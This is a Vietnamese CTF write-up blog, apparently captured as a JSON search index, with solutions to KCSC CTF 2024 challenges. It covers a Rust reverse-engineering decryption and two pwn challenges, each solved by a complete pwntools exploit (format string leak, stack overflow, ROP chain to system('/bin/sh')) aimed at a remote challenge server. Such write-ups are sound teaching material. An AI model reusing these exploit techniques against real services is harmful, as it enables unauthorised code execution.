KCSC{1t_co5ld_be_right7_fla9_here_^.^@@} ","date":"2024-05-16","objectID":"/2024-kcscctf/:1:2","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"rev/RE x Rust Challenge Information 5 solves / 489 pts / by JohnathanHuuTri Given files: flag.enc rexrust Description: Challenge name tell everything! ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x01 Overview Quan sát tổng quan, chương trình đọc dữ liệu từ file flag.txt, thực hiện encrypt qua 4 phase và ghi dữ liệu vào file flag.enc. ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:1","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x2 Analyze Phase 1 Ở phase 1 này, sau khi debug và quan sát đầu ra, ta biết được hàm này đảo ngược chuỗi ban đầu. __int64 __fastcall revsrust::phase1::hff4818a749ae18af(char *input, unsigned __int64 input_length) { [...] v12 = input; v13 = input_length; v10[0] = _$LT$I$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h8fa0f7e2a7257375(); v10[1] = v2; while ( 1 ) { result = core::iter::range::_$LT$impl$u20$core..iter..traits..iterator..Iterator$u20$for$u20$core..ops..range..Range$LT$A$GT$$GT$::next::h9b7c30fb7e58cb7b(v10); v11 = v4; v10[2] = result; if ( !result ) break; v9 = v11; v14 = v11; if ( v11 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v7 = input[v11]; v15 = v7; v8 = input_length - 1; if ( !input_length ) core::panicking::panic::hee69a8315e4031d6(); v6 = v8 - v11; if ( v8 \u003c v11 ) core::panicking::panic::hee69a8315e4031d6(); if ( v6 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); if ( v11 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); input[v11] = input[v6]; v5 = input_length - 1 - v9; if ( input_length - 1 \u003c v9 ) core::panicking::panic::hee69a8315e4031d6(); if ( v5 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); input[v5] = v7; } return result; } ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:2","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x03 Analyze Phase 2 Ở phase này, chương trình hoán vị 4 bit sau của byte này với 4 bit sau của byte kia. Ví dụ 0x12, 0x34 sẽ thành 0x14, 0x32. unsigned __int64 __fastcall revsrust::phase2::hf6a223748e1b24a0(char *rev_input, unsigned __int64 input_length) { unsigned __int64 result; // rax unsigned __int64 v3; // [rsp+8h] [rbp-80h] char v4; // [rsp+17h] [rbp-71h] unsigned __int64 v5; // [rsp+38h] [rbp-50h] unsigned __int64 v6; // [rsp+48h] [rbp-40h] unsigned __int64 i; // [rsp+68h] [rbp-20h] for ( i = 0LL; ; i += 2LL ) { result = input_length; if ( i \u003e= input_length ) break; v6 = i + 1; if ( i == -1LL ) core::panicking::panic::hee69a8315e4031d6(); if ( v6 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v5 = i + 1; if ( i + 1 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); if ( i \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v4 = rev_input[i] \u0026 0xF | rev_input[v5] \u0026 0xF0; if ( i \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); rev_input[i] = rev_input[v6] \u0026 0xF | rev_input[i] \u0026 0xF0; v3 = i + 1; if ( i + 1 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); rev_input[v3] = v4; if ( i \u003e= 18446744073709551614uLL ) core::panicking::panic::hee69a8315e4031d6(); } return result; } Phase này được reimplement như sau for i in range(0, len(flag), 2): tmp = flag[i] \u0026 0xF | flag[i+1] \u0026 0xF0 flag[i], flag[i+1] = flag[i+1] \u0026 0xF | flag[i] \u0026 0xF0, tmp Vì chúng chỉ swap giá trị giữa 2 byte cho nhau. Vậy nên chúng ta hoàn toàn có thể lấy luôn hàm này để lấy lại dữ liệu ban đầu. ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:3","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x04 Analyze Phase 3 __int64 __fastcall revsrust::phase3::h3b700fce28ff291d(char *input, unsigned __int64 input_length) { [...] v16 = input; v17 = input_length; if ( input_length \u003c 2 ) core::panicking::panic::hee69a8315e4031d6(); v14[0] = _$LT$I$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h8fa0f7e2a7257375(); v14[1] = v2; while ( 1 ) { result = core::iter::range::_$LT$impl$u20$core..iter..traits..iterator..Iterator$u20$for$u20$core..ops..range..Range$LT$A$GT$$GT$::next::h9b7c30fb7e58cb7b(v14); idx = v4; v14[2] = result; if ( !result ) break; v12 = idx; v18 = idx; if ( idx \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v10 = input[idx]; v11 = idx + 2; if ( idx \u003e= 0xFFFFFFFFFFFFFFFELL ) core::panicking::panic::hee69a8315e4031d6(); if ( v11 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v5 = input[v11]; v21 = input[idx]; v22 = v5; if ( idx \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); input[idx] = v10 - v5; v9 = v12 + 2; if ( __CFADD__(v12, 2LL) ) core::panicking::panic::hee69a8315e4031d6(); if ( v9 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v8 = input[v9]; if ( v12 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); v6 = input[v12]; v19 = input[v9]; v20 = v6; v7 = v12 + 2; if ( v12 + 2 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); input[v7] = v8 - v6; } return result; } Phase 3 được reimplement như sau for i in range(len(flag) - 2): flag[i] = (flag[i] - flag[i+2]) \u0026 0xFF flag[i+2] = (flag[i+2] - flag[i]) \u0026 0xFF Chúng ta dễ dàng dựng lại hàm rev_phase3 là def rev_phase3(flag): for i in range(len(flag) - 3, -1, -1): flag[i+2] = (flag[i+2] + flag[i]) \u0026 0xFF flag[i] = (flag[i] + flag[i+2]) \u0026 0xFF return flag ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:4","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x05 Analyze Phase 4 Ở phase 4 này, chương trình tạo 1 số random 4 byte và xor tất cả các byte với input. Nếu chú ý, ta sẽ biết được các byte xor với nhau thì kết quả thu được luôn nằm trong khoảng [0, 255]. Từ đây, ta dễ dàng xây dựng hàm rev_phase4 bằng brute-force. __int64 __fastcall revsrust::phase4::h4b371456b6af0137(BYTE *input, unsigned __int64 input_length) { [...] v10 = input; v11 = input_length; v6[0] = rand::rngs:🧵:thread_rng::h616f5a4f3d25fa48(); v5 = rand::rng::Rng::gen::h3adc539b43e4e5da(v6); v12 = v5; v6[1] = 0LL; v6[2] = input_length; v7[0] = _$LT$I$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h8fa0f7e2a7257375(); v7[1] = v2; while ( 1 ) { v8 = core::iter::range::_$LT$impl$u20$core..iter..traits..iterator..Iterator$u20$for$u20$core..ops..range..Range$LT$A$GT$$GT$::next::h9b7c30fb7e58cb7b(v7); v9 = v3; if ( !v8 ) break; v13 = v9; if ( v9 \u003e= input_length ) core::panicking::panic_bounds_check::h11601ba3567ad740(); input[v9] ^= HIBYTE(v5) ^ BYTE2(v5) ^ BYTE1(v5) ^ v5; } return core::ptr::drop_in_place$LT$rand..rngs..thread..ThreadRng$GT$::h46c61e1ef1922a5a(v6); } Phase 4 được reimplement như sau for i in range(len(flag)): LOBYTE = (rd \u003e\u003e 0) \u0026 0xFF BYTE1 = (rd \u003e\u003e 8) \u0026 0xFF BYTE2 = (rd \u003e\u003e 16) \u0026 0xFF HIBYTE = (rd \u003e\u003e 24) \u0026 0xFF flag[i] ^= (BYTE1 ^ BYTE2 ^ HIBYTE ^ LOBYTE) Dễ dàng build được hàm rev_phase4 def rev_phase4(flag, rd): for i in range(len(flag)): flag[i] ^= rd return flag Ghép các phần lại với nhau, script hoàn chỉnh của chúng ta là def phase1(flag): return flag[::-1] def phase2(flag): for i in range(0, len(flag), 2): tmp = flag[i] \u0026 0xF | flag[i+1] \u0026 0xF0 flag[i], flag[i+1] = flag[i+1] \u0026 0xF | flag[i] \u0026 0xF0, tmp return flag def rev_phase3(flag): for i in range(len(flag) - 3, -1, -1): flag[i+2] = (flag[i+2] + flag[i]) \u0026 0xFF flag[i] = (flag[i] + flag[i+2]) \u0026 0xFF return flag def rev_phase4(flag, rd): for i in range(len(flag)): flag[i] ^= rd return flag for i in range(0, 0xff): f = open(\"flag.enc\", \"rb\") data = list(f.read()) res = phase1(phase2(rev_phase3(rev_phase4(data, i)))) print(\"\".join([chr(i) for i in res])) Nhìn sơ qua các kết quả thu được, ta có được đáp án chính xác. FLAG: KCSC{r3v3rs3_rust_1s_funny_4nd_34sy_227da29931351} ","date":"2024-05-16","objectID":"/2024-kcscctf/:2:5","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"rev/behind the scenes Challenge Information 0 solve / 500 pts / by ndt Given files: chall.zip Description: Don’t miss anything. ","date":"2024-05-16","objectID":"/2024-kcscctf/:3:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"pwn/KCSBanking Challenge Information 10 solve / 464 pts / by JohnathanHuuTri Given files: banking.zip Description: Our club KCSC has created a new bank called KCSBank. It’s still in beta but we cannot find out any bugs, please help us! nc 103.163.24.78 10002 ","date":"2024-05-16","objectID":"/2024-kcscctf/:4:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x01 Overview Chương trình có 2 lựa chọn chính: general_action account_action int __cdecl main(int argc, const char **argv, const char **envp) { int main_status; // [rsp+Ch] [rbp-4h] main_status = 0; init(argc, argv, envp); puts(\"Welcome to KCSBank\"); while ( !main_status ) { main_status = general_action(); if ( !main_status ) account_action(); } return 0; } Với lựa chọn general_action, chương trình có 3 chức năng: login register exit Trong hàm register, fullname được chứa ở ptr_fullname. Khi xref, ta thấy nó còn được xuất hiện ở hàm info. Với lựa chọn account_action, chương trình có 4 chức năng: deposit withdraw info logout Xem qua một lượt các hàm, ta thấy hàm info có Format String Bug. int info() { printf(ptr_fullname); // fsb return printf(\"Money: %u\\n\", total_money); } ","date":"2024-05-16","objectID":"/2024-kcscctf/:4:1","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x02 Format String Bug Đề bài cho chúng ta Dockerfile, hướng tiếp cận của mình là tận dụng bug trên để Return To Libc. Mình định nghĩa một số hàm để thao tác nhanh với chương trình như sau def login(username, password): sla(b\"\u003e \", b\"1\") sla(b\"Username: \", username.encode(\"utf8\")) sla(b\"Password: \", str(password).encode(\"utf8\")) def register(username, password, fullname): sla(b\"\u003e \", b\"2\") sla(b\"New username: \", username.encode(\"utf8\")) sla(b\"New password: \", str(password).encode(\"utf8\")) sla(b\"Your full name: \", fullname) def info(): sla(b\"\u003e \", b\"3\") def logout(feedback): sla(b\"\u003e \", b\"4\") sla(b\"Please leave a feedback: \", feedback) Leak stack \u0026 libc Bước đầu tiên, chúng ta sẽ đi tạo một account với fullname là payload nhằm leak được các giá trị như stack, libc. payload = b\"%6$p|%29$p|\" register(\"hacker\", 123, payload) login(\"hacker\", 123) info() data_leak = rl().strip().split(b\"|\") stack_leak = int(data_leak[0], 16) libc_leak = int(data_leak[1], 16) libc_base = libc_leak - libc.symbols[\"puts\"] - 0x01fa log.info(f\"stack leak = {hex(stack_leak)}\") log.info(f\"libc leak = {hex(libc_leak)}\") log.info(f\"libc base = {hex(libc_base)}\") ","date":"2024-05-16","objectID":"/2024-kcscctf/:4:2","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x03 Bug Stack Buffer Overflow Về cơ bản, chương trình không có bug BOF. Nhưng chúng ta đang có một số thứ để có thể trigger được bug này. Chức năng logout cho nhập feedback có kích thước tối đa 256 byte. FSB cho phép thay đổi giá trị của thanh ghi RBP. Khi end chương trình, RSP sẽ nằm ở vị trí 0x00007fffffffdc48, vậy RBP sẽ là 0x00007fffffffdc40. Với FSB đầu tiên, ta thấy RBP phía trên nằm ngay ở ô stack đầu tiên. Ta hoàn toàn thay đổi được giá trị cho nó. Feedback của chúng ta được nhập bắt đầu từ 0x00007fffffffdb10. Vậy mình sẽ đưa RBP về 0x00007fffffffdb50 để thử trigger xem. Lưu ý, giá trị stack_leak mình có được ở phía trên là 0x00007fffffffdc20. fake_rbp = stack_leak - 0xd0 log.info(f\"fake rbp = {hex(fake_rbp)}\") payload = f\"%{fake_rbp \u0026 0xFFFF}c%6$hn\" register(\"hacker\", 123, payload) login(\"hacker\", 123) info() Stack layout sau khi mình đổi RBP và nhập feedback Trigger thành công với input b\"a\" * 72 + b\"1234567\\n\" ","date":"2024-05-16","objectID":"/2024-kcscctf/:4:3","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x04 Final script Okay, việc chúng ta bây giờ chỉ là đi build ropchain và lấy shell. #!/usr/bin/env python3 from pwn import * exe = ELF(\"./banking_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.update(os = \"linux\", arch = \"amd64\", log_level = \"debug\", terminal = \"cmd.exe /c start wsl\".split(), binary = exe) # p = process(exe.path) p = remote(\"103.163.24.78\", 10002) sl = p.sendline sa = p.sendafter sla = p.sendlineafter rl = p.recvline ru = p.recvuntil def debug(): gdb.attach(p, gdbscript = \"\"\" b *info+23 b *main+0x54 continue \"\"\") pause() def login(username, password): sla(b\"\u003e \", b\"1\") sla(b\"Username: \", username.encode(\"utf8\")) sla(b\"Password: \", str(password).encode(\"utf8\")) def register(username, password, fullname): sla(b\"\u003e \", b\"2\") sla(b\"New username: \", username.encode(\"utf8\")) sla(b\"New password: \", str(password).encode(\"utf8\")) sla(b\"Your full name: \", fullname) def info(): sla(b\"\u003e \", b\"3\") def logout(feedback): sla(b\"\u003e \", b\"4\") sla(b\"Please leave a feedback: \", feedback) # debug() # Leak stack + libc payload = b\"%6$p|%29$p|\" register(\"hacker\", 123, payload) login(\"hacker\", 123) info() data_leak = rl().strip().split(b\"|\") stack_leak = int(data_leak[0], 16) libc_leak = int(data_leak[1], 16) libc_base = libc_leak - libc.symbols[\"puts\"] - 0x01fa log.info(f\"stack leak = {hex(stack_leak)}\") log.info(f\"libc leak = {hex(libc_leak)}\") log.info(f\"libc base = {hex(libc_base)}\") logout(b\"new_feedback\") # Change RBP fake_rbp = stack_leak - 0xd0 log.info(f\"fake rbp = {hex(fake_rbp)}\") payload = f\"%{fake_rbp \u0026 0xFFFF}c%6$hn\" register(\"hacker\", 123, payload) login(\"hacker\", 123) info() # Build ropchain binsh = libc_base + next(libc.search(b\"/bin/sh\\x00\")) system = libc_base + libc.symbols[\"system\"] poprdi = libc_base + 0x240e5 ret = poprdi + 1 payload = b\"a\"*72 + p64(ret) + p64(poprdi) + p64(binsh) + p64(system) logout(payload) p.interactive() FLAG: KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?} ","date":"2024-05-16","objectID":"/2024-kcscctf/:4:4","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"pwn/Petshop Challenge Information 9 solve / 472 pts / by JohnathanHuuTri Given files: petshop libc-2.31.so ld-2.31.so Description: Welcome to our new petshop! You can find various kinds of pet, sometimes bugs too. nc 103.163.24.78 10001 ","date":"2024-05-16","objectID":"/2024-kcscctf/:5:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x01 Overview Chương trình có 4 lựa chọn: buy sell info exit int __fastcall main(int argc, const char **argv, const char **envp) { char s[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(\"Seller --\u003e Welcome to our pet shop!\\n\"); do { puts(\"Seller --\u003e How may I help you?\"); printf(\"You --\u003e \"); fgets(s, 0x20, stdin); if ( !strncmp(s, \"buy \", 4uLL) ) { buy((__int64)\u0026s[4]); } else if ( !strncmp(s, \"sell \", 5uLL) ) { sell(\u0026s[5]); } else if ( !strncmp(s, \"info \", 5uLL) ) { info(\u0026s[5]); } puts(\u0026byte_2298); } while ( strncmp(s, \"exit\", 4uLL) ); puts(\"Seller --\u003e Thank you for shopping with us!\"); return 0; } Tùy vào từng lựa chọn, các hàm sẽ parse input ra thành các giá trị phù hợp để phục vụ cho việc xử lý của mỗi hàm. Sau khi phân tích sơ qua source code, mình đã tạo một struct pet_struct như sau: 00000000 pet_struct struc ; (sizeof=0x10, mappedto_18) 00000000 type dq ? ; offset 00000008 name dq ? ; offset 00000010 pet_struct ends Hàm buy int __fastcall buy(char *a1) { int v1; // ebx pet_struct **v2; // rax int v3; // eax pet_struct *v4; // rbx int pet_idx; // [rsp+1Ch] [rbp-424h] BYREF char s[1037]; // [rsp+20h] [rbp-420h] BYREF char pet_type[19]; // [rsp+42Dh] [rbp-13h] BYREF memset(s, 0, 0x400uLL); if ( (unsigned int)__isoc99_sscanf(a1, \"%3s %d\", pet_type, \u0026pet_idx) != 2 ) { goto LABEL_x52C; } --pet_idx; v1 = pet_count; pet_list[v1] = (pet_struct *)malloc(0x10uLL); if ( strncmp(pet_type, \"cat\", 3uLL) ) { if ( strncmp(pet_type, \"dog\", 3uLL) ) { puts(\"We only have cats and dogs!\"); v2 = pet_list; pet_list[pet_count] = 0LL; return (int)v2; } if ( pet_idx \u003e 3 ) { puts(\"Invalid type of dog!\"); v2 = pet_list; pet_list[pet_count] = 0LL; return (int)v2; } pet_list[pet_count]-\u003etype = dogs[pet_idx]; goto LABEL_x4BD; } if ( pet_idx \u003c= 3 ) // OOB { pet_list[pet_count]-\u003etype = cats[pet_idx]; LABEL_x4BD: puts(\"Seller --\u003e What is your pet's name?\"); printf(\"You --\u003e \"); fgets(s, 1024, stdin); v3 = pet_count++; v4 = pet_list[v3]; v4-\u003ename = strdup(s); LABEL_x52C: LODWORD(v2) = puts(\"Seller --\u003e It's fun to have pet in your house!\"); return (int)v2; } puts(\"Invalid type of cat!\"); v2 = pet_list; pet_list[pet_count] = 0LL; return (int)v2; } Tóm tắt hàm buy như sau: Parse input theo cấu trúc buy | pet_type | pet_type_index Cho mua một trong hai loại pet: dog / cat Mỗi loại pet có 4 kiểu Cho phép nhập tên pet tối đa 1024 byte Hàm sell int __fastcall sell(char *a1) { int reason_size; // [rsp+18h] [rbp-208h] BYREF unsigned int pet_list_idx; // [rsp+1Ch] [rbp-204h] BYREF char reason[512]; // [rsp+20h] [rbp-200h] BYREF memset(reason, 0, sizeof(reason)); if ( (unsigned int)__isoc99_sscanf(a1, \"%d\", \u0026pet_list_idx) != 1 || pet_list_idx \u003e 7 || !pet_list[pet_list_idx] ) { return puts(\"Seller --\u003e There are no pet in that index!\"); } pet_list[pet_list_idx] = 0LL; puts(\"Seller --\u003e Nooooo, why you want to sell your pet?\"); puts(\"Seller --\u003e How many characters in your reason?\"); printf(\"You --\u003e \"); if ( (unsigned int)__isoc99_scanf(\"%d\", \u0026reason_size) == 1 \u0026\u0026 (reason_size \u003c= 0 || reason_size \u003e 511) ) { return puts(\"Invalid size!\"); } getchar(); puts(\"Seller --\u003e Your reason?\"); printf(\"You --\u003e \"); fgets(reason, reason_size, stdin); return puts(\"Seller --\u003e That seems reasonable!\"); } Tóm tắt hàm sell như sau: Parse input theo cấu trúc sell | pet_list_index Cho bán một trong hai loại: dog / cat Cho nhập reason với kích thước reason_size nằm trong khoảng [1, 511] Hàm info int __fastcall info(const char *a1) { pet_struct *v1; // rax int k; // [rsp+14h] [rbp-Ch] int j; // [rsp+18h] [rbp-8h] int i; // [rsp+1Ch] [rbp-4h] if ( !strncmp(a1, \"cat\", 3uLL) ) { LODWORD(v1) = puts(\"In here we have:\"); for ( i = 0; i \u003c= 3; ++i ) { LODWORD(v1) = printf(\"%d. %s\\n\", (unsigned int)(i + 1), cats[i]); } } else if ( !strncmp(a1, \"dog\", 3uLL) ) { LODWORD(v1) = puts(\"In here we have:\"); for ( j = 0; j \u003c= 3; ++j ) { LODWORD(v1) = printf(\"%d. %s\\n\", (unsigned int)(j + 1), dogs[j]); } } else { LODWORD(v1) = strncmp(a1, \"mine\", 4uLL); if ( !(_DWORD)v1 ) { LODWORD(v1) = puts(\"Your p","date":"2024-05-16","objectID":"/2024-kcscctf/:5:1","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x02 Bug Out-off-Bound Ở hàm buy, ta nhận thấy rằng pet_type_idx có thể nhận giá trị âm, từ đó gây nên bug OOB. int __fastcall buy(char *a1) { int pet_type_idx; // [rsp+1Ch] [rbp-424h] BYREF if ( (unsigned int)__isoc99_sscanf(a1, \"%3s %d\", pet_type, \u0026pet_type_idx) != 2 ) goto LABEL_x52C; --pet_type_idx; if ( pet_type_idx \u003c= 3 ) // OOB pet_list[pet_count]-\u003etype = cats[pet_type_idx]; } Tận dụng chức năng in ra toàn bộ thông tin pet_list của hàm info. Ta sẽ leak được các giá trị của binary và libc. Leak binary Mua một bé mèo với cú pháp buy cat 1. Do idx sẽ bị trừ đi một, vậy nên em mèo của ta sẽ có tên ở địa chỉ cats[0]. Nhìn xung quanh các giá trị lân cận, ta thấy có giá trị 0x0000555555558008 là địa chỉ binary. Ta hoàn toàn leak được giá trị đó với idx = -2. buy(\"cat\", -2, cyclic(1020)) info(\"mine\") ru(b\"1. \") binary_leak = u64(p.recv(6) + b\"\\x00\\x00\") binary_base = binary_leak - 0x4008 log.info(f\"binary leak = {hex(binary_leak)}\") log.info(f\"binary base = {hex(binary_base)}\") Leak libc (Invisible) Sau khi search trong memory, mình không thấy có địa chỉ nào phù hợp để leak ra libc. Vì vậy mình tạm hoãn công việc này tại đây. ","date":"2024-05-16","objectID":"/2024-kcscctf/:5:2","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x03 Bug Stack Buffer Overflow Với việc cho nhập pet_name tối đa tới tận 1024 byte. Mình thoáng nghĩ có điều gì không ổn tại đây. Mình dùng cyclic tạo thử 1020 byte để xem input này có ảnh hưởng gì tới các hàm khác không. Thử vào hàm sell, đi tới hàm nhập reason_size thì ta thấy reason_size đang có giá trị rác jaaf rất giống trong input tạo bởi cyclic. Từ đây, ta hoàn toàn điều khiển được reason_size và trigger được bug BOF. Nguyên nhân dẫn tới lỗi này là reason_size không được initialize, vậy nên nó có thể nhận giá trị rác từ input nào đó. int __fastcall sell(char *a1) { int reason_size; // [rsp+18h] [rbp-208h] BYREF char reason[512]; // [rsp+20h] [rbp-200h] BYREF if ( (unsigned int)__isoc99_scanf(\"%d\", \u0026reason_size) == 1 \u0026\u0026 (reason_size \u003c= 0 || reason_size \u003e 511) ) { return puts(\"Invalid size!\"); } fgets(reason, reason_size, stdin); } Chưa hết, ta phải bypass được điều kiện check ở trên. Có một trick với hàm scanf là nếu như ta nhập input không đúng với định dạng fmt thì hàm sẽ trả về 0 và không làm thay đổi giá trị của đối số. Vậy input mình nhập vào đơn giản chỉ là - sẽ bypass được đoạn check ở trên. def sell(pet_list_idx, reason): payload = (\"sell \" + str(pet_list_idx)).encode(\"utf8\") sla(b\"You --\u003e \", payload) sla(b\"You --\u003e \", b\"-\") sla(b\"You --\u003e \", reason) ","date":"2024-05-16","objectID":"/2024-kcscctf/:5:3","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x04 Leak Libc Sau khi dựa trên stack, ta tính được offset để overwrite return address là 0x208 byte. Tới đây thì chúng ta dễ dàng build ROPChain để leak libc. poprdi = binary_base + 0x1a13 ret = poprdi + 1 putsgot = binary_base + exe.got[\"puts\"] putsplt = binary_base + exe.plt[\"puts\"] backaddr = binary_base + exe.symbols[\"main\"] payload1 = flat(b\"A\" * 0x208, poprdi, putsgot, putsplt, backaddr) sell(0, payload1) ru(b\"reasonable!\\n\") libc_leak = u64(p.recv(6) + b\"\\x00\\x00\") libc_base = libc_leak - libc.symbols[\"puts\"] log.info(f\"libc leak = {hex(libc_leak)}\") log.info(f\"libc base = {hex(libc_base)}\") ","date":"2024-05-16","objectID":"/2024-kcscctf/:5:4","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x05 Final script Hoàn thiện exploit, có được shell của thử thách. Có một vấn đề nhỏ mà chúng ta cần chú ý ở hàm sell là if ( (unsigned int)__isoc99_sscanf(a1, \"%d\", \u0026pet_list_idx) != 1 || pet_list_idx \u003e 7 || !pet_list[pet_list_idx] ) { return puts(\"Seller --\u003e There are no pet in that index!\"); } Nếu chúng ta chỉ tạo 1 con pet thì sau lần sell thứ nhất pet_list sẽ rỗng. Vậy để hợp lệ hóa cho bước kiểm tra này, mình sẽ tạo thêm 1 con pet nữa. #!/usr/bin/env python3 from pwn import * exe = ELF(\"./petshop_patched\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") context.update(os = \"linux\", arch = \"amd64\", log_level = \"debug\", terminal = \"cmd.exe /c start wsl\".split(), binary = exe) # p = process(exe.path) p = remote(\"103.163.24.78\", 10001) sl = p.sendline sa = p.sendafter sla = p.sendlineafter rl = p.recvline ru = p.recvuntil def debug(): gdb.attach(p, gdbscript = \"\"\" b *main+82 b *sell+367 continue \"\"\") pause() # debug() def buy(pet_type, pet_type_idx, pet_name): payload = (\"buy \" + pet_type + \" \" + str(pet_type_idx)).encode(\"utf8\") sla(b\"You --\u003e \", payload) sla(b\"You --\u003e \", pet_name) def sell(pet_list_idx, reason): payload = (\"sell \" + str(pet_list_idx)).encode(\"utf8\") sla(b\"You --\u003e \", payload) sla(b\"You --\u003e \", b\"-\") sla(b\"You --\u003e \", reason) def info(option): payload = (\"info \" + option).encode(\"utf8\") sla(b\"You --\u003e \", payload) buy(\"cat\", -2, cyclic(536) + p32(0x300)) info(\"mine\") ru(b\"1. \") binary_leak = u64(p.recv(6) + b\"\\x00\\x00\") binary_base = binary_leak - 0x4008 log.info(f\"binary leak = {hex(binary_leak)}\") log.info(f\"binary base = {hex(binary_base)}\") poprdi = binary_base + 0x1a13 ret = poprdi + 1 putsgot = binary_base + exe.got[\"puts\"] putsplt = binary_base + exe.plt[\"puts\"] backaddr = binary_base + exe.symbols[\"main\"] payload1 = flat(b\"A\" * 0x208, poprdi, putsgot, putsplt, backaddr) sell(0, payload1) ru(b\"reasonable!\\n\") libc_leak = u64(p.recv(6) + b\"\\x00\\x00\") libc_base = libc_leak - libc.symbols[\"puts\"] log.info(f\"libc leak = {hex(libc_leak)}\") log.info(f\"libc base = {hex(libc_base)}\") # create fake pet to validate pet deletion buy(\"cat\", -2, cyclic(536) + p32(0x300)) binsh = libc_base + next(libc.search(b\"/bin/sh\")) system = libc_base + libc.symbols[\"system\"] payload2 = flat(b\"B\" * 0x208, ret, poprdi, binsh, system) sell(1, payload2) p.interactive() FLAG: KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????} ","date":"2024-05-16","objectID":"/2024-kcscctf/:5:5","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"Solutions for some challenges in KCSC Recruitment 2023 by ducdatdau","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"\rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 0 auto 15px;\r}\r\r","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:0:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"rev/two-faces (0 solve) Challenge Information 0 solve / 500 pts / by sonx Given files: rev_two_faces.rar Description: Don’t judge a book by its cover. ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:1:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x01 Overview Nội dung 